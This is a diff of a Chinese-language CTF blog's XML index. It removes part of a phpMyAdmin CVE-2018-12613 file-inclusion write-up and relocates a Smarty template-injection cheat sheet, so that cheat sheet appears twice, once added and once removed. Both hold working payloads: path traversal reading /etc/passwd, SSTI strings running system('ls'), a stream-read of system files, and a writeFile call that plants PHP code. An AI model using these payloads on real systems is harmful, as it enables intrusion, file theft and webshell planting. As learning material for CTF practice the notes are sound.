-<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
-<p>结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
-<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
-<p>得到 flag</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
-<h1 id="总结">总结</h1>
-<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>phpmyadmin 漏洞</tag>
-        <tag>CVE-2018-12613</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Jinjia2+Flask模板注入</title>
     <url>/2022/04/05/Jinjia2+Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
@@ -513,6 +513,65 @@
       <tags>
         <tag>Jinjia2</tag>
         <tag>Flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Smarty模板注入</title>
+    <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
+<span id="more"></span>
+<h1 id="漏洞确认">漏洞确认</h1>
+<p>先通过决策树，判断是否属于smarty：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
+<p>然后通过<code>&#123;$smarty.version&#125;</code>判断smarty版本。</p>
+<h1 id="漏洞利用">漏洞利用</h1>
+<h2 id="常规利用">常规利用</h2>
+<p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 在Smarty3的官方手册里有以下描述：</p>
+<blockquote>
+<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
+</blockquote>
+<h2 id="literal-标签">{literal} 标签</h2>
+<p>官方手册这样描述这个标签：</p>
+<blockquote>
+<p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
+</blockquote>
+<p>因此可以利用如下payload实现PHP代码执行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>需要注意的是：<strong>从PHP7开始，这种方法就失效了</strong>。</p>
+<h2 id="静态方法">静态方法</h2>
+<p><code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 <code>self</code> 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p>
+<p>smarty类中的<code>getStreamVariable()</code> 方法可以获取传入变量的流</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = fgets(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>因此我们可以用这个方法读文件，payload:<br />
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>然而，这个payload有时候会触发报错，因为这是<strong>旧版本的SSTI的利用方式</strong>，并不适用于新版本的。<strong>而且在3.1.30的Smarty版本中官方已经把该静态方法删除</strong>。</p>
+<p><strong>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</strong></p>
+<p>同样：<code>Smarty_Internal_Write_File</code> 这个类中有一个<code>writeFile</code>方法</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes file in a safe way to disk * * <span class="doctag">@param</span>  string $_filepath complete filepath * <span class="doctag">@param</span>  string $_contents file content * <span class="doctag">@param</span>  Smarty $smarty    smarty instance * * <span class="doctag">@throws</span> SmartyException * <span class="doctag">@return</span> boolean true */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = error_reporting();</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = dirname(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            umask(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造的payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="if标签">{if}标签</h2>
+<p>官方文档中看到这样的描述：</p>
+<p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;, and, is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;*</code></p>
+<p>payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式：&#123;<span class="keyword">if</span> PHP代码&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. &#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 执行phpinfo()</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. &#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 调用system执行系统命令ls</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="命令执行">命令执行</h2>
+<p>php中的命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀死由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
+<p>linux查看文件的命令：<br />
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat, tac, more, less, head, tail, nl, paste, od, bzmore, bzless</span><br></pre></td></tr></table></figure></p>
+<p>php文件读取函数：<br />
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r() fread() fgets() var_dump()</span><br></pre></td></tr></table></figure></p>
+<h1 id="题目">题目</h1>
+<ol type="1">
+<li><a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></li>
+<li><a href="https://hdfzzf.icu/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/">BJDCTF2020 The mystery of ip</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Smarty</tag>
       </tags>
   </entry>
   <entry>
@@ -769,65 +828,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Smarty模板注入</title>
-    <url>/2022/04/05/Smarty%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
-<span id="more"></span>
-<h1 id="漏洞确认">漏洞确认</h1>
-<p>先通过决策树，判断是否属于smarty：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
-<p>然后通过<code>&#123;$smarty.version&#125;</code>判断smarty版本。</p>
-<h1 id="漏洞利用">漏洞利用</h1>
-<h2 id="常规利用">常规利用</h2>
-<p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 在Smarty3的官方手册里有以下描述：</p>
-<blockquote>
-<p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
-</blockquote>
-<h2 id="literal-标签">{literal} 标签</h2>
-<p>官方手册这样描述这个标签：</p>
-<blockquote>
-<p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p>
-</blockquote>
-<p>因此可以利用如下payload实现PHP代码执行：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>需要注意的是：<strong>从PHP7开始，这种方法就失效了</strong>。</p>
-<h2 id="静态方法">静态方法</h2>
-<p><code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 <code>self</code> 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法。</p>
-<p>smarty类中的<code>getStreamVariable()</code> 方法可以获取传入变量的流</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = fgets(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(<span class="variable">$fp</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_result</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;smarty) ? <span class="keyword">$this</span>-&gt;smarty : <span class="keyword">$this</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>因此我们可以用这个方法读文件，payload:<br />
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
-<p>然而，这个payload有时候会触发报错，因为这是<strong>旧版本的SSTI的利用方式</strong>，并不适用于新版本的。<strong>而且在3.1.30的Smarty版本中官方已经把该静态方法删除</strong>。</p>
-<p><strong>利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</strong></p>
-<p>同样：<code>Smarty_Internal_Write_File</code> 这个类中有一个<code>writeFile</code>方法</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Writes file in a safe way to disk * * <span class="doctag">@param</span>  string $_filepath complete filepath * <span class="doctag">@param</span>  string $_contents file content * <span class="doctag">@param</span>  Smarty $smarty    smarty instance * * <span class="doctag">@throws</span> SmartyException * <span class="doctag">@return</span> boolean true */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = error_reporting();</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = umask(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = dirname(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !file_exists(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . str_replace(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, uniqid(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Windows&#x27; rename() fails if the destination exists, * Linux&#x27; rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux&#x27; rename() * seems to be smart enough to handle that for us. */</span></span><br><span class="line">        <span class="keyword">if</span> (Smarty::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (is_file(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @unlink(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @rename(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SmartyException(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            chmod(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            umask(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        error_reporting(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Smarty_Internal_Extension_Config::clearConfig(<span class="keyword">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>构造的payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="if标签">{if}标签</h2>
-<p>官方文档中看到这样的描述：</p>
-<p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如<code>||*, or, &amp;&amp;, and, is_array(),</code> 等等，如：<code>&#123;if is_array($array)&#125;&#123;/if&#125;*</code></p>
-<p>payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">格式：&#123;<span class="keyword">if</span> PHP代码&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. &#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 执行phpinfo()</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. &#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment"># 调用system执行系统命令ls</span></span><br></pre></td></tr></table></figure></p>
-<h2 id="命令执行">命令执行</h2>
-<p>php中的命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀死由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出</span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
-<p>linux查看文件的命令：<br />
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat, tac, more, less, head, tail, nl, paste, od, bzmore, bzless</span><br></pre></td></tr></table></figure></p>
-<p>php文件读取函数：<br />
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r() fread() fgets() var_dump()</span><br></pre></td></tr></table></figure></p>
-<h1 id="题目">题目</h1>
-<ol type="1">
-<li><a href="https://hdfzzf.icu/2022/04/05/bugku_聪明的PHP/">bugku_聪明的PHP</a></li>
-<li><a href="https://hdfzzf.icu/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/">BJDCTF2020 The mystery of ip</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>Smarty</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Tornado_render模板注入</title>
     <url>/2022/04/05/Tornado_render%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Tornado模板注入的知识点以及相关的payload。</p>
@@ -953,6 +953,37 @@
       </tags>
   </entry>
   <entry>
+    <title>bugku_聪明的php</title>
+    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
+<p>随便给一个参数，得到如下界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
